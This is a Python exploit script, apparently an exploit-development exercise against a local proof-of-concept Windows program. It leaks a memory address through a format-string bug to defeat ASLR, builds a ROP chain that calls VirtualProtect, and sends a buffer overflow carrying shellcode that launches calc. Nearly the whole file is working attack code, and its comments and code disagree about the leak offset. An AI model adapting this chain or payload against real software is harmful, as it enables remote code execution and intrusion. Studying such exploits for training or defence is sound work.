#!/usr/bin/python
import socket
import os
import sys
import time
import struct

# relative displacement is 20a0
# leak address is 436b20a0
# base address is 0x436b20a0 - 0x20a0 = 436b0000
# rop chain generated with mona.py - www.corelan.be

leak_me="%4x"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("127.0.0.1", 8888))
# read line 1
x = expl.recv(1024)
print("Leaking Address")
#print(x)

# send input_1 to trigger format string so we can read the address
expl.send(leak_me)
# read back line 2 sent from server
x = expl.recv(1024)
# leaking address
#print(x)
leaked_address = int(x, 16)
# calculating base address since we know leaked address is at displacment of 0x43b8
base_address = leaked_address - 0x43b8
print("Base Address: " + hex(base_address))

x = expl.recv(1024)
#print(x)


print("Building Rop Chain")

def create_rop_chain(base_address):

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
     

      #[---INFO:gadgets_to_set_edi:---]
      base_address + 0x1e2f,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
      base_address + 0x1da1,  # RETN (ROP NOP) [PocMemLeak.exe] ** REBASED ** ASLR
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      
    #[---INFO:gadgets_to_set_esi:---]
      base_address + 0x1027,  # POP EAX # POP ECX # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
      base_address + 0x300c,  # ptr to &VirtualProtect() [IAT PocMemLeak.exe] ** REBASED ** ASLR
      0x41414141,  # Filler (compensate)
      base_address + 0x1046,  # MOV ESI,DWORD PTR DS:[EAX] # RETN [PocMemLeak.exe] ** REBASED ** ASLR 

      #[---INFO:gadgets_to_set_eax:---]
      base_address + 0x101b,  # POP EAX # POP ECX # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
      0x90909090,  # nop
      0x41414141,  # Filler (compensate)
            
      #[---INFO:gadgets_to_set_ebx:---]
      base_address + 0x1e31,  # POP EBX # POP EBP # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
      0x00000201,  # 0x00000201-> ebx
      0x41414141,  # Filler (compensate)

      #[---INFO:gadgets_to_set_ebp:---]
      base_address + 0x104e,  # POP EBP # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
      base_address + 0x1016,  # & jmp esp [PocMemLeak.exe] ** REBASED ** ASLR

      #[---INFO:gadgets_to_set_edx:---]
      base_address + 0x1931,  # POP ECX # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
      0x00000040,  # 0x00000040-> edx
      base_address + 0x1030,  # MOV EDX,ECX # RETN [PocMemLeak.exe] ** REBASED ** ASLR 

     #[---INFO:gadgets_to_set_ecx:---]
      base_address + 0x1025,  # POP ECX # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
      base_address + 0x4aa5,  # &Writable location [PocMemLeak.exe] ** REBASED ** ASLR


     #[---INFO:pushad:---]
      base_address + 0x1019,  # PUSHAD # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain(base_address)

print("First Rop gadget Address: 0x%x"%(base_address + 0x1e2f))

sec = raw_input("Press Enter to continue...")


shell_calc = ""
shell_calc += "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
shell_calc += "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
shell_calc += "\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
shell_calc += "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
shell_calc += "\x57\x78\x01\xc2\x8b\x7a\x20\x01"
shell_calc += "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
shell_calc += "\x45\x81\x3e\x43\x72\x65\x61\x75"
shell_calc += "\xf2\x81\x7e\x08\x6f\x63\x65\x73"
shell_calc += "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
shell_calc += "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
shell_calc += "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
shell_calc += "\xb1\xff\x53\xe2\xfd\x68\x63\x61"
shell_calc += "\x6c\x63\x89\xe2\x52\x52\x53\x53"
shell_calc += "\x53\x53\x53\x53\x52\x53\xff\xd7"


junk = "\x41"*756 + rop_chain + "\x90"*32  + shell_calc + "\x90"*(32)
expl.send(junk)


expl.close()
